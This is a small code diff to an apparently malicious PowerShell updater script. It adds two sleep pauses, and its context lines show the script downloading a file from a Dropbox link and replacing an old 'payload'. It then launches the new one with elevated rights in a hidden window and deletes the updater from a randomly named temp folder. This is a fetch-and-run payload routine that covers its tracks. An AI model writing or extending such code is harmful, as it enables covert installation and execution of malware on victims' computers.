@@ -7,11 +7,17 @@ Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/bhb8pi9rfq842p65huhm1/wsappa
 #remove old payload
 remove-item wsappa.exe
 
+#sleep
+start-sleep 5
+
 #change name
 rename-item new_wsappa.exe wsappa.exe
 
 #start new payload
 Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden
+
+#sleep
+start-sleep 5
 
 #clean uo
 powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
